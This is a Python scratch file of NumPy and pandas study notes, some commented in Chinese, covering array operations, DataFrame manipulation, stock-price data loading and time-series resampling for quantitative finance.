import pandas as pd
import numpy as np
from datetime import datetime
from numpy.linalg import multi_dot
np.__version__
np.array([1,2,3,4,5])
np.array([1,2,3.5,4,5])
np.array([1, 2, 3, 4, 5], dtype='float32')
np.array([[1,2],[3,4],[5,6]])
np.empty(5)
np.zeros(5, dtype=int)
np.ones(5, dtype=int)
np.ones((3,5))
np.full((3,5), 5)
np.arange(0,10,2)
np.linspace(0,1,5)
np.random.random(3)
np.random.random((3,3))
np.random.normal(0,1,(3,3))
np.eye(3)
np.random.seed(1)
# 1D array
x1 = np.random.randint(10, size=5)
# 2D array
x2 = np.random.randint(10, size=(2, 3))
# 3D array
x3 = np.random.randint(10, size=(2, 3, 5))
print("The Array Attributes are:")
print("-"*25)
print(f"x3 ndim:      {x3.ndim}")
print(f"x3 shape:     {x3.shape}")
print(f"x3 size:      {x3.size}")
print(f"x3 dtype:     {x3.dtype}")
print(f"x3 itemsize:  {x3.itemsize}")
print(f"x3 nbytes:    {x3.nbytes}")
x2[0,0]
x2[0,1]
x2[-1,-1]
x = np.arange(10)
x[:5]
x[5:7]
x[::2]
x[1::2]
x[::-1]
x[::-2]
x2[0,:]
x2[:,0]
x2[:2, :3]
x2[:, ::2]
x2[::-1, ::-1]
x2_sub = x2[:2,:2]
print(x2_sub)
x2_sub[0,0] = 10
print(x2_sub)
x4 = np.arange(1,10)
x5 = x4.reshape((3,3))
x6 = np.array([1,2,3])
x6.reshape(1,3)
x6.reshape(3,1)
arr = np.arange(15). reshape((3,5))
arr.T
arr = np.random.randn(10)
np.sort(arr)
arr2 = np.random.random((5,3))
np.sort(arr2, axis=0)
np.argsort(arr)
np.argsort(arr2, axis=0)
x = np.array([1, 2, 3])
y = np.array([4, 5, 6])
np.concatenate([x, y])
z = [10, 100, 1000]
print(np.concatenate([x, y, z]))
arr = np.array([[1, 2, 3], [4, 5, 6]])
np.concatenate([arr, arr])
x = np.array([1, 2, 3])
arr = np.array([[9, 8, 7], [6, 5, 4]])
np.vstack([x, arr])
y = np.array([[55], [55]])
np.hstack([arr, y])
np.split
np.hsplit
np.vsplit
x = np.arange(9)
x1, x2, x3 = np.split(x, 3)
print(x1, x2, x3)
x1, x2, x3 = np.split(x, [3,5])
print(x1, x2, x3)
arr = np.arange(16).reshape((4, 4))
upper, lower = np.vsplit(arr, [2])
print(upper)
print(lower)
left, right = np.hsplit(arr, [2])
print(left)
print(right)
arr = np.arange(10)
np.sqrt(arr)
np.exp(arr)
x = np.random.randn(10)
y = np.random.randn(10)
np.maximum(x,y)
np.minimum(x,y)
x = np.arange(5)
y = np.empty(5)
np.multiply(x,10, out=y)
print(y)
x = np.arange(1,6)
np.add.reduce(x)
np.multiply.reduce(x)
np.add.accumulate(x)
np.multiply.accumulate(x)
np.multiply.outer(x, x)
x = np.arange(5)
print("x      =", x)
print("x + 5  =", x + 5)
print("x - 5  =", x - 5)
print("x * 2  =", x * 2)
print("x / 2  =", x / 2)
print("x // 2 =", x // 2)  # floor division
numbers = np.random.rand(100000)
print(f'Mininum{np.min(numbers): .4f}, Maximim{np.max(numbers): .4f}')
numbers.min(), numbers.max(), numbers.sum()
# %timeit min(numbers)
# %timeit np.min(numbers)
# %timeit numbers.min()
np.sum
np.prod
np.mean
np.std
np.var
np.min
np.max
np.argmin
np.argmax
np.median
np.percentile
arr = np.random.random((3,4))
arr.sum()
arr.sum(axis=0)
arr.sum(axis=1)
x = np.arange(1,6)
x < 3
np.count_nonzero(x<4)
np.sum(x<4)
np.any(x>8)
np.all(x<8)
np.sum((x>2) & (x<5))
np.save('outfile', x)
np.savetxt('outfile.txt', x)
print(np.load('outfile.npy'))
print(np.loadtxt('outfile.txt'))
a = np.array([[1,2],[3,4]])
b = np.array([[11,12],[13,14]])
np.dot(a,b)
a.dot(b)
np.vdot(b, a)
w = np.random.random((10000, 100))
x = np.random.random((100, 1000))
y = np.random.random((1000, 5))
z = np.random.random((5, 333))
out_1 = multi_dot([w, x, y, z])
out_2 = np.dot(np.dot(np.dot(w, x), y), z)
out_2.shape
out_3 = w.dot(x).dot(y).dot(z)
out_3.shape
from numpy import linalg as LA
dia = np.diag((2, 3, 4))
e_val,e_vec = LA.eig(dia)
A = np.array([[3,-4], [2,-6]])
LA.eig(A)
LA.det(A)
LA.inv(A)
A = np.array([[2,1,-2], [3,2,2], [5,4,3]])
b = np.array([10,1,4])
x = LA.solve(A,b)
np.allclose(np.dot(A,x), b)
df = pd.DataFrame()
returns = np.log(df['S&P 500']).diff().fillna(0)

# ========================== pandas =======================
pd.__version__
pd.options.display.max_rows = 1000
pd.set_option("display.min_rows", 4)  # 显示不下则默认使用min_rows行
pd.reset_option("display.max_rows")
pd.set_option("display.precision", 5)  # 显示精度
s = pd.Series(dtype=float)
print(s)
s = np.arange(10, 20)
pd.Series(s)
s = {'a': 0., 'b': 1., 'c': 2.}
pd.Series(s)
pd.Series(123, index=[0, 1, 2, 3])
df = pd.DataFrame()
print(df)
data = [['Program', 'CQF'], ['Module', 1], ['School', 'Fitch'], ['City', 'London'], ['Country', 'UK']]
df = pd.DataFrame(data, columns=['Name', 'Details'])
data = {'Name': ['Program', 'Module', 'School', 'City', 'Country'], 'Details': ['CQF', 1, 'Fitch', 'London', 'UK']}
df = pd.DataFrame(data)
data = {'one': pd.Series([1, 2, 3], index=['a', 'b', 'c']), 'two': pd.Series([1, 2, 3, 4], index=['a', 'b', 'c', 'd'])}
df = pd.DataFrame(data)
data = np.ones((3,4))
df = pd.DataFrame(data)
df = pd.DataFrame(df.iloc[:, 0])
s = pd.Series(np.arange(10, 20))
print(f'First Element in a Series: {s[0]}')  # first element
print(f'First Element in a Series: {s[:3]}')  # first three elements
s.loc[1]
s = pd.Series({'a': 0., 'b': 1., 'c': 2.})
s['a'], s['c']
data = {'Name': ['Program', 'Module', 'School', 'City', 'Country'], 'Details': ['CQF', 1, 'Fitch', 'London', 'UK']}
df = pd.DataFrame(data,  index = ['a', 'b', 'c', 'd', 'e'])
df['Name']
df.loc['d']
df.iloc[2]
df.iloc[4]
df[2:4]
df = pd.DataFrame(np.arange(1, 21), columns=['Numeric'])
df.head()
df.tail()
df.index
df.info()
df.shape
df.values
# Sum
print(f'Sum                : {df.sum()[0]}')
print(f'Mean               : {df.mean()[0]}')
print(f'Median             : {df.median()[0]}')
print(f'Standard deviation : {df.std()[0]:.2f}')
print(f'Minimum            : {df.min()[0]}')
print(f'Maximum            : {df.max()[0]}')
print(f'Index of Minimum   : {df.idxmin()[0]}')
print(f'Index of Maximum   : {df.idxmax()[0]}')
df.cumsum().iloc[-1]
df.cumprod().iloc[-1]
df.describe().T
s = pd.Series(np.arange(1, 6), index=['e', 'a', 'c', 'b', 'd'])
s.sort_index()
s.sort_values()
np.random.seed(0)
df = pd.DataFrame(np.arange(10).reshape(2, 5), index=['two', 'one'], columns=['d', 'e', 'a', 'c', 'b'])
df.sort_index(axis=1)
df.sort_index(axis=1, ascending=False)
dd = pd.DataFrame({'col1': [2, 1, 1, 1], 'col2': [1, 3, 2, 4]})
dd.sort_values(by=['col1', 'col2'])
data = pd.read_csv('data/spy.csv', index_col=0, parse_dates=True)
data.head()
data[['Volume']].groupby(data.index.year).sum().head()
data.groupby(data.index.year).sum().head()
pd.pivot_table(data=data, index = data.index.year, values='Volume', aggfunc=sum).head()
pd.pivot_table(data=data, index = [data.index.year, data.index.month], values='Volume', aggfunc=sum).head(13)
data[data['Close'] > 300]['Close']
data[data['Open'] == data['High']].count()
df1 = data.copy()
df1.loc[df1['Open'] == df1['High'], 'O=H'] = -1
df1.loc[df1['Open'] == df1['Low'], 'O=L'] = 1
df1.fillna(0, inplace=True)
df1.head()
df1['CHG'] = 100*(df1['Close'].sub(df1['Open']))/df1['Open']
df1[df1['O=L'] == 1]['CHG'].sum()
df1[df1['O=H'] == -1]['CHG'].sum()
data = pd.read_csv('data/spy.csv', index_col=0, parse_dates=True)
data.tail()
data = pd.read_excel('data/mystocks.xlsx',  sheet_name='AMZN', index_col=0, parse_dates=True)
data.tail()
df = pd.read_csv(
    # 该参数为数据在电脑中的路径，可以不填写
    filepath_or_buffer='/Users/jxing/Desktop/201704课程/20170423_class3/data/sz000002.csv',
    # 该参数代表数据的分隔符，csv文件默认是逗号。其他常见的是'\t'
    sep=',',
    # 该参数代表跳过数据文件的的第1行不读入
    skiprows=1,
    # nrows，只读取前n行数据，若不指定，读入全部的数据
    nrows=15,
    # 将指定列的数据识别为日期格式。若不指定，时间数据将会以字符串形式读入。一开始先不用。
    # parse_dates=['交易日期'],
    # 将指定列设置为index。若不指定，index默认为0, 1, 2, 3, 4...
    # index_col=['交易日期'],
    # 读取指定的这几列数据，其他数据不读取。若不指定，读入全部列
    usecols=['交易日期', '股票代码', '股票名称', '收盘价', '涨跌幅', '成交量', '新浪概念', 'MACD_金叉死叉'],
    # 当某行数据有问题时，报错。设定为False时即不报错，直接跳过该行。当数据比较脏乱的时候用这个。
    error_bad_lines=False,
    # 将数据中的null识别为空值
    na_values='NULL',
    # 更多其他参数，请直接搜索"pandas read_csv"，要去逐个查看一下。比较重要的，header等
)
# 还有read_table、read_excel、read_json等，他们的参数内容都是大同小异，可以自行搜索查看。
sdf = df.shape  # 输出dataframe有多少行、多少列。
sdf = df.shape[0]  # 取行数量，相应的列数量就是df.shape[1]
sdf = df.columns  # 顺序输出每一列的名字，演示如何for语句遍历。
sdf = df.index  # 顺序输出每一行的名字，可以for语句遍历。
sdf = df.dtypes  # 数据每一列的类型不一样，比如数字、字符串、日期等。该方法输出每一列变量类型
sdf = df.head(3)  # 看前3行的数据，默认是5。与自然语言很接近
sdf = df.tail(3)  # 看最后3行的数据，默认是5。
sdf = df.sample(n=3)  # 随机抽取3行，想要去固定比例的话，可以用frac参数
sdf = df.describe()  # 非常方便的函数，对每一列数据有直观感受；只会对数字类型的列有效
# 对print出的数据格式进行修正
pd.set_option('expand_frame_repr', False)  # 当列太多时不换行
pd.set_option('max_colwidth', 8) # 设定每一列的最大宽度，恢复原设置的方法，pd.reset_option('max_colwidth')
sdf = df['股票代码']  # 根据列名称来选取，读取的数据是Series类型
sdf = df[['股票代码', '收盘价']]  # 同时选取多列，需要两个括号，读取的数据是DataFrame类型
sdf = df[[0, 1, 2]]  # 也可以通过列的position来选取
# loc操作：通过label（columns和index的名字）来读取数据
sdf = df.loc['12/12/2016']  # 选取指定的某一行，读取的数据是Series类型
sdf = df.loc['13/12/2016': '06/12/2016']  # 选取在此范围内的多行，和在list中slice操作类似，读取的数据是DataFrame类型
sdf = df.loc[:, '股票代码':'收盘价']  # 选取在此范围内的多列，读取的数据是DataFrame类型
sdf = df.loc['13/12/2016': '06/12/2016', '股票代码':'收盘价']  # 读取指定的多行、多列。逗号之前是行的范围，逗号之后是列的范围。读取的数据是DataFrame类型
sdf = df.loc[:, :]  # 读取所有行、所有列，读取的数据是DataFrame类型
sdf = df.at['12/12/2016', '股票代码']  # 使用at读取指定的某个元素。loc也行，但是at更高效。
# iloc操作：通过position来读取数据
sdf = df.iloc[0]  # 以index选取某一行，读取的数据是Series类型
sdf = df.iloc[1:3]  # 选取在此范围内的多行，读取的数据是DataFrame类型
sdf = df.iloc[:, 1:3]  # 选取在此范围内的多列，读取的数据是DataFrame类型
sdf = df.iloc[1:3, 1:3]  # 读取指定的多行、多列，读取的数据是DataFrame类型
sdf = df.iloc[:, :]  # 读取所有行、所有列，读取的数据是DataFrame类型
sdf = df.iat[1, 1]  # 使用iat读取指定的某个元素。使用iloc也行，但是iat更高效。
# =====列操作
sdf = df['股票名称'] + '_地产'  # 字符串列可以直接加上字符串，对整列进行操作
sdf = df['收盘价'] * 100  # 数字列直接加上或者乘以数字，对整列进行操作。
sdf = df['收盘价'] * df['成交量']  # 两列之间可以直接操作。收盘价*成交量计算出的是什么？
df['股票名称+行业'] = df['股票名称'] + '_地产'
sdf = df['收盘价'].mean()  # 求一整列的均值，返回一个数。会自动排除空值。
sdf = df[['收盘价', '成交量']].mean()  # 求两列的均值，返回两个数，Series
sdf = df[['收盘价', '成交量']]
sdf = df[['收盘价', '成交量']].mean(axis=1)  # 求两列的均值，返回DataFrame。axis=0或者1要搞清楚。
# axis=1，代表对整几列进行操作。axis=0（默认）代表对几行进行操作。实际中弄混很正常，到时候试一下就知道了。
sdf = df['收盘价'].max()  # 最大值
sdf = df['收盘价'].min()  # 最小值
sdf = df['收盘价'].std()  # 标准差
sdf = df['收盘价'].count()  # 非空的数据的数量
sdf = df['收盘价'].median()  # 中位数
sdf = df['收盘价'].quantile(0.25)  # 25%分位数
# =====shift类函数、删除列的方式
df['昨天收盘价'] = df['收盘价'].shift(-1)  # 读取上一行的数据，若参数设定为3，就是读取上三行的数据；若参数设定为-1，就是读取下一行的数据；
sdf = df[['收盘价', '昨天收盘价']]
del df['昨天收盘价']  # 删除某一列的方法
df['涨跌'] = df['收盘价'].diff(-1)  # 求本行数据和上一行数据相减得到的值
sdf = df[['收盘价', '涨跌']]
df.drop(['涨跌'], axis=1, inplace=True)  # 删除某一列的另外一种方式，inplace参数指是否替代原来的df
sdf = df
df['涨跌幅_计算'] = df['收盘价'].pct_change(-1)  # 类似于diff，但是求的是两个数直接的比例，相当于求涨跌幅
# =====cum(cumulative)类函数
df['成交量_cum'] = df['成交量'].cumsum()  # 该列的累加值
sdf = df[['成交量', '成交量_cum']]
sdf = (df['涨跌幅'] + 1.0).cumprod()  # 该列的累乘值，此处计算的就是资金曲线，假设初始1元钱。
# =====其他列函数
df['收盘价_排名'] = df['收盘价'].rank(ascending=True, pct=False)  # 输出排名。ascending参数代表是顺序还是逆序。pct参数代表输出的是排名还是排名比例
sdf = df[['收盘价', '收盘价_排名']]
del df['收盘价_排名']
sdf = df['股票代码'].value_counts()  # 计数。统计该列中每个元素出现的次数。返回的数据是Series
# =====筛选操作，根据指定的条件，筛选出相关拿数据。
sdf = df['股票代码'] == 'sh000002'  # 判断股票代码是否等于sz000002
sdf = df[df['股票代码'] == 'sz000002']  # 将判断为True的输出：选取股票代码等于sz000002的行
sdf = df[df['股票代码'].isin(['sz000002', 'sz000003 ', 'sz000004'])]  # 选取股票代码等于sz000002的行
sdf = df[df['收盘价'] >= 24.0]  # 选取收盘价大于24的行
sdf = df[(df.index >= '03/12/2016') & (df.index <= '06/12/2016')]  # 两个条件，或者的话就是|
sdf = df.dropna(how='any')  # 将带有空值的行删除。how='any'意味着，该行中只要有一个空值，就会删除，可以改成all。
sdf = df.dropna(subset=['MACD_金叉死叉', '涨跌幅'], how='all')  # subset参数指定在特定的列中判断空值。
sdf = df.fillna(value='没有金叉死叉')  # 直接将缺失值赋值为固定的值
df['MACD_金叉死叉'].fillna(value=df['收盘价'], inplace=True)  # 直接将缺失值赋值其他列的数据
sdf = df.fillna(method='ffill')  # 向上寻找最近的一个非空值，以该值来填充缺失的位置，全称forward fill，非常有用
sdf = df.fillna(method='bfill')  # 向下寻找最近的一个非空值，以该值来填充确实的位置，全称backward fill
sdf = df.notnull()  # 判断是否为空值，反向函数为isnull()
sdf = df[df['MACD_金叉死叉'].notnull()]  # 将'MACD_金叉死叉'列为空的行输出
df.reset_index(inplace=True)
sdf = df.sort_values(by=['交易日期'], ascending=1)  # by参数指定按照什么进行排序，acsending参数指定是顺序还是逆序，1顺序，0逆序
sdf = df.sort_values(by=['股票名称', '交易日期'], ascending=[1, 1])  # 按照多列进行排序
# =====两个df上下合并操作，append操作
df.reset_index(inplace=True)
df1 = df.iloc[0:10][['交易日期', '股票代码', '收盘价', '涨跌幅']]
sdf = df1
df2 = df.iloc[5:15][['交易日期', '股票名称', '收盘价', '涨跌幅']]
sdf = df2
sdf = df1.append(df2)  # append操作，将df1和df2上下拼接起来。注意观察拼接之后的index
df3 = df1.append(df2, ignore_index=True)  # ignore_index参数，用户重新确定index
sdf = df3
df3.drop_duplicates(subset=['收盘价', '交易日期'], keep='first', inplace=True)
sdf = df3
sdf = df.rename(columns={'MACD_金叉死叉': '金叉死叉', '涨跌幅': '涨幅'})  # rename函数给变量修改名字。使用dict将要修改的名字传给columns参数
sdf = df.empty  # 判断一个df是不是为空，此处输出不为空
sdf = pd.DataFrame().empty  # pd.DataFrame()创建一个空的DataFrame，此处输出为空
sdf = df.T  # 将数据转置，行变成列，很有用
# =====字符串处理
sdf = df['股票代码']
sdf = 'sz000002'[:2]
sdf = df['股票代码'].str[:2]
sdf = df['股票代码'].str.upper()  # 加上str之后可以使用常见的字符串函数对整列进行操作
sdf = df['股票代码'].str.lower()
sdf = df['股票代码'].str.len()  # 计算字符串的长度,length
df['股票代码'].str.strip()  # strip操作，把字符串两边的空格去掉
sdf = df['股票代码'].str.contains('sh')  # 判断字符串中是否包含某些特定字符
sdf = df['股票代码'].str.replace('sz', 'sh')  # 进行替换，将sz替换成sh
# split操作
sdf = df['新浪概念'].str.split('；')  # 对字符串进行分割
sdf = df['新浪概念'].str.split('；').str[:2]  # 分割后取第一个位置
sdf = df['新浪概念'].str.split('；', expand=True)  # 分割后并且将数据分列
# =====时间处理
df['交易日期'] = pd.to_datetime(df['交易日期'])  # 将交易日期由字符串改为时间变量
sdf = df['交易日期']
sdf = df.iloc[0]['交易日期']
sdf = df.dtypes
sdf = pd.to_datetime('1999年01月01日')  # pd.to_datetime函数：将字符串转变为时间变量
sdf = df.at[0, '交易日期']
sdf = df['交易日期'].dt.year  # 输出这个日期的年份。相应的month是月份，day是天数，还有hour, minute, second
sdf = df['交易日期'].dt.week  # 这一天是一年当中的第几周
sdf = df['交易日期'].dt.dayofyear  # 这一天是一年当中的第几天
sdf = df['交易日期'].dt.dayofweek  # 这一天是这一周当中的第几天，0代表星期一
sdf = df['交易日期'].dt.weekday  # 和上面函数相同，更加常用
sdf = df['交易日期'].dt.weekday_name  # 和上面函数相同，返回的是星期几的英文，用于报表的制作。
sdf = df['交易日期'].dt.days_in_month  # 这一天是这一月当中的第几天
sdf = df['交易日期'].dt.is_month_end  # 这一天是否是该月的开头，是否存在is_month_end？
sdf = df['交易日期'] + pd.Timedelta(days=1)  # 增加一天，Timedelta用于表示时间差数据
sdf = (df['交易日期'] + pd.Timedelta(days=1)) - df['交易日期']  # 增加一天然后再减去今天的日期
# =====rolling、expanding操作
sdf = df['收盘价'].mean()
# 使用rolling函数
df['收盘价_3天均值'] = df['收盘价'].rolling(5).mean()
sdf = df[['收盘价', '收盘价_3天均值']]
# rolling(n)即为取最近n行数据的意思，只计算这n行数据。后面可以接各类计算函数，例如max、min、std等
sdf = df['收盘价'].rolling(3).max()
sdf = df['收盘价'].rolling(3).min()
sdf = df['收盘价'].rolling(3).std()
# rolling可以计算每天的最近3天的均值，如果想计算每天的从一开始至今的均值，应该如何计算？ 使用expanding操作
df['收盘价_至今均值'] = df['收盘价'].expanding().mean()
sdf = df[['收盘价', '收盘价_至今均值']]
# expanding即为取从头至今的数据。后面可以接各类计算函数
sdf = df['收盘价'].expanding().max()
sdf = df['收盘价'].expanding().min()
sdf = df['收盘价'].expanding().std()
# rolling和expanding简直是为量化领域量身定制的方法，经常会用到。
df.to_csv('output.csv', encoding='gbk', index=False)
df.sub(df.iloc[-1], axis=1)
df.sub(df['a'], axis=0)
s = pd.Series(np.arange(10))
div, rem = divmod(s, 3)
div, rem = divmod(s, [2, 2, 3, 3, 4, 4, 5, 5, 6, 6])
(df > 0).any(axis=0).any()
(df + df).equals(df * 2)
d = pd.Series(['foo', 'bar', 'baz']) == 'foo'
d = pd.Series(['foo', 'bar', 'baz']) == np.array(['foo', 'bar', 'qux'])
df.combine_first(df)
ts_stand = (df - df.mean()) / df.std()
xs_stand = df.sub(df.mean(1), axis=0).div(df.std(1), axis=0)
# 函数	描述
' add()、sub()、mul()、div() 及 radd()、rsub()、 eq、ne、lt、gt、le、ge、empty、any()、all()、bool() '
# count	统计非空值数量
# sum	汇总值
# mean	平均值
# mad	平均绝对偏差
# median	算数中位数
# min	最小值
# max	最大值
# mode	众数
# abs	绝对值
# prod	乘积
# std	贝塞尔校正的样本标准偏差
# var	无偏方差
# sem	平均值的标准误差
# skew	样本偏度 (第三阶)
# kurt	样本峰度 (第四阶)
# quantile	样本分位数 (不同 % 的值)
# cumsum	累加
# cumprod	累乘
# cummax	累积最大值
# cummin	累积最小值
# nunique 非空去重数量
# isna
# value_counts 直方图统计
df.describe(percentiles=[.05, .25, .75, .95])
s.idxmin(axis=1), s.idxmax(axis=0)
df5 = pd.DataFrame({"A": np.random.randint(0, 7, size=50), "B": np.random.randint(-10, 15, size=50)})
df5.mode()  # 众数
arr = np.random.randn(20)
pd.cut(arr, [-5, -1, 0, 1, 5])  # 按箱子分
pd.qcut(arr, [0, .25, .5, .75, 1])  # 按数据分位数分
# 函数应用
# 表级函数应用：pipe()
# 行列级函数应用： apply()
# 聚合 API： agg() 与 transform()
# 元素级函数应用：applymap()
# f(g(h(df), arg1=1), arg2=2, arg3=3) === (df.pipe(h).pipe(g, arg1=1).pipe(f, arg2=2, arg3=3))
def subtract_and_divide(x, sub, divide=1):
    return (x - sub) / divide
df.apply(subtract_and_divide, args=(5,), divide=3)
df.agg(np.sum, axis=0)
df.agg(['sum', 'mean'])
df.agg(['sum', lambda x: x.mean()])
df.agg({'A': 'mean', 'B': 'sum'})
df.agg({'A': ['mean', 'min'], 'B': 'sum'})
df.transform(np.abs)
df.transform(lambda x: x.abs())
df.A.transform(np.abs)
df.transform([np.abs, lambda x: x + 1])
df.A.transform([np.abs, lambda x: x + 1])
df.transform({'A': np.abs, 'B': lambda x: x + 1})
df.transform({'A': np.abs, 'B': [lambda x: x + 1, 'sqrt']})
df.applymap(lambda x: str(x))
df.A.map(lambda x: str(x))
df.A.map({'a': 0, 'b': 1})
df.reindex(index=['c', 'f', 'b'], columns=['three', 'two', 'one'])  # 重置索引 没有的行或列用nan填充
df.ffill(axis=0).bfill().fillna(method='nearest').fillna(3)
df.rename(columns={'one': 'foo', 'two': 'bar'}, index={'a': 'apple', 'b': 'banana', 'd': 'durian'})
df.rename(lambda x: str(x).upper(), axis=0)
df.columns = df.columns.str.upper()
df.add_prefix('pre_')  # 列加前缀
df.add_suffix('_sub')

for c in df:
    print(c)
for index, r in df.iterrows():
    print(r)
for r in df.itertuples():  # 这个快
    print(r)
for r, c in df.items():
    print(r, c)


df.sort_index(axis=0, ascending=False)
df.sort_values(by='two')
df.sort_values(by=['one', 'two'], na_position='first')
df.nsmallest(3, 'a')  # 快于排序后取前三
df.nlargest(5, ['a', 'c'])  # 快于排序后取前五
dft1 = pd.DataFrame({'a': [1, 0, 1], 'b': [4, 5, 6], 'c': [7, 8, 9]})
dft1 = dft1.astype({'a': np.bool, 'c': np.float64, 'b': np.str})
dft1.copy().astype('float32')
df.dates.diff()
m = ['1.1', 2, 3]
pd.to_numeric(m, errors='coerce').fillna(0)
m = ['5us', pd.Timedelta('1day')]
pd.to_timedelta(m, errors='ignore')
pd.to_datetime(m, errors='coerce')
df.apply(pd.to_datetime)
df.apply(pd.to_numeric)
df.select_dtypes(include=['object'])
df.select_dtypes(include=['number', 'bool'], exclude=['unsignedinteger'])

def combiner(x, y):
    return np.where(pd.isna(x), y, x)


class special():
    df['item_price'].str.replace('$', '').astype('float')
    pd.show_versions()
    df = df[::-1].reset_index(drop=True)  # 反转行
    df: pd.DataFrame = df[:, ::-1]  # 反转列
    df.info(memory_usage='deep')  # 内存占用
    pd.read_clipboard()  # 从剪切板获取
    a = df.sample(frac=0.75, random_state=1234)  # 随机取出75%的数据
    b = df.drop(a.index)
    df = df[(df.name == '张三') | (df.age > 23) & (~df.city.isin(['上海', '深圳']))]
    df.dropna(thresh=len(df)*0.9, axis=1)  # 删除缺失率在90%的列数据
    df['姓', '名'] = df.full_name.str.split('_', expand=True)
    df.groupby('姓').age.transform('sum')
    df.groupby('姓').age.agg(['sum', 'count', 'mean']).unstack()
    df.loc['张三': '李四', '姓': 'age']  # 选择子区域
    df[:3, 'a': 'd']
    df[['张三', '李四'], ['age', 'name']]  # 选择交叉区域
    df[['张三', '李四']]
    df[df.age > 19]
    df.query('`年龄` <19')
    df.assign(shouru=lambda x: (x['count'] / x['age']), city='常量')
    df.pivot_table(index='姓', columns='age', values='good', aggfunc='mean', margins=True)
    pd.cut(df.age, bins=[0, 18, 25, 100], labels=['child', 'qingnian', 'man', 'old'])
    dd = df.style.format({'date': '{:%m/%d/%y}', 'close': '${:.2f}', 'volume': '{:,}'})
    dd.hide_index().highlight_max('close', color='red').highlight_min('close', color='green').background_gradient(subset='volume', cmap='Blues')
    dd.hide_index().bar('volume', color='red', align='zero').set_caption('这是标题')
    # df.groupby('品种').agg(
    #     最低=pd.NamedAgg(column='身高', aggfunc='min'),
    #     最高=pd.NamedAgg(column='身高', aggfunc='max'),
    #     平均体重=pd.NamedAgg(column='体重', aggfunc=np.mean),
    # )
    # df.groupby('品种').agg(最低=('身高', min), 最高=('身高', max), 平均体重=('体重', np.mean))
    # df.groupby('品种').身高.agg(最低=min, 最高=max)
    # df.groupby('品种').身高.agg([lambda x: x.iloc[0], lambda x: x.iloc[-1]])


class Timespec(object):
    dti = pd.to_datetime(['1/1/2018', np.datetime64('2018-01-01'), datetime(2018, 1, 1)])
    dti = pd.date_range('2018-01-01', periods=3, freq='H').tz_localize('UTC')
    dti.resample('2H').mean()
    friday = pd.Timestamp('2018-01-05')
    friday.day_name()
    saturday = friday + pd.Timedelta('1 day')
    monday = friday + pd.offsets.BDay()
    pd.Timestamp(datetime(2012, 5, 1))
    # Out[28]: Timestamp('2012-05-01 00:00:00')
    pd.Timestamp('2012-05-01', tz='US/Pacific')
    # Out[29]: Timestamp('2012-05-01 00:00:00')
    pd.Timestamp(2012, 5, 1)
    # Out[30]: Timestamp('2012-05-01 00:00:00')
    pd.to_datetime(pd.Series(['Jul 31, 2009', '2010-01-10', None]))
    pd.to_datetime(['14-01-2012', '01-14-2012'], dayfirst=True)
    pd.to_datetime('12-11-2010 00:00', format='%d-%m-%Y %H:%M')
    pd.to_datetime([1349720105, 1349806505, 1349892905, 1349979305, 1350065705], unit='s')
    pd.to_datetime([1349720105100, 1349720105200, 1349720105300,1349720105400, 1349720105500], unit='ms')
    pd.to_datetime(1490195805433502912, unit='ns')
    pd.to_datetime([1, 2, 3], unit='D', origin=pd.Timestamp('1960-01-01'))
    stamps = pd.date_range('2012-10-08 18:15:05', periods=4, freq='D')
    timestamp = (stamps - pd.Timestamp("1970-01-01")) // pd.Timedelta('1s')
    weekmask = 'Mon Wed Fri'
    holidays = [datetime.datetime(2011, 1, 5), datetime.datetime(2011, 3, 14)]
    pd.bdate_range(start='2011-01-01', end='2020-01-01', freq='C', weekmask=weekmask, holidays=holidays)  # 自定义日期
    df['10/31/2011':'12/31/2011']
    df['2020']  # 选取整年
    df['2020-08']  # 选取整月
    df['2013-1':'2013-2']
    df['2013-1':'2013-2-28']
    df['2013-1':'2013-2-28 00:00:00']
    df['2013-1-15':'2013-1-15 12:30:00']
    df.loc['2013-01-05']
    df = pd.DataFrame([0], index=pd.DatetimeIndex(['2019-01-01'], tz='US/Pacific'))
    df['2019-01-01 12:00:00+04:00':'2019-01-01 13:00:00+04:00']
    # 精度为分钟（或更高精度）的时间戳字符串，给出的是标量，不会被当作切片
    df['2011-12-31 23:59']
    df['2011-12-31 23:59:00']
    # '为了实现精准切片，要用 .loc 对行进行切片或选择'
    df.loc['2011-12-31 23:59']
    # '属性	说明
    # year	datetime 的年
    # month	datetime 的月
    # day	datetime 的日
    # hour	datetime 的小时
    # minute	datetime 的分钟
    # second	datetime 的秒
    # microsecond	datetime 的微秒
    # nanosecond	datetime 的纳秒
    # date	返回 datetime.date（不包含时区信息）
    # time	返回 datetime.time（不包含时区信息）
    # timetz	返回带本地时区信息的 datetime.time
    # dayofyear	一年里的第几天
    # weekofyear	一年里的第几周
    # week	一年里的第几周
    # dayofweek	一周里的第几天，Monday=0, Sunday=6
    # weekday	一周里的第几天，Monday=0, Sunday=6
    # weekday_name	这一天是星期几 （如，Friday）
    # quarter	日期所处的季节：Jan-Mar = 1，Apr-Jun = 2 等
    # days_in_month	日期所在的月有多少天
    # is_month_start	逻辑判断是不是月初（由频率定义）
    # is_month_end	逻辑判断是不是月末（由频率定义）
    # is_quarter_start	逻辑判断是不是季初（由频率定义）
    # is_quarter_end	逻辑判断是不是季末（由频率定义）
    # is_year_start	逻辑判断是不是年初（由频率定义）
    # is_year_end	逻辑判断是不是年末（由频率定义）
    # is_leap_year	逻辑判断是不是日期所在年是不是闰年'
    ts = pd.Timestamp('2016-10-30 00:00:00', tz='Europe/Helsinki')
    ts + pd.Timedelta(days=1)
    ts + pd.DateOffset(days=1)
    ts.shift(5)
    ts.tshift(5, freq='D')
    ts.asfreq(pd.offsets.BDay(), how='Start')  # 频率转换 没有数据的时间用nan填充
    ts.asfreq(pd.offsets.BDay(), method='pad')
    rng = pd.date_range('1/1/2012', periods=100, freq='S')
    ts = pd.Series(np.random.randint(0, 500, len(rng)), index=rng)
    ts.resample('5T').ohlc()  # T == Min
    'sum、mean、std、sem、max、min、mid、median、first、last、ohlc'
    ts.resample('5Min', closed='left').mean()
    ts.resample('5Min', closed='right').mean()
    ts.resample('5Min', label='left', loffset='1s').mean()
    df.resample('3T')['A'].agg([np.sum, np.mean, np.std])
    df.resample('3T').agg({'A': 'sum', 'B': lambda x: x.std()})
    resampled = df.resample('H')
    for name, group in resampled:
        print(name)
    # 频率
    p = pd.Period('2014-07-01 09:00', freq='H')
    p + 1  # Period('2014-07-01 10:00', 'H')
    p + pd.offsets.Hour(2)  # Period('2014-07-01 11:00', 'H')
    p + datetime.timedelta(minutes=120)  # Period('2014-07-01 11:00', 'H')
    p + np.timedelta64(7200, 's')  # Period('2014-07-01 11:00', 'H')
    p + pd.offsets.Minute(5)  # Error
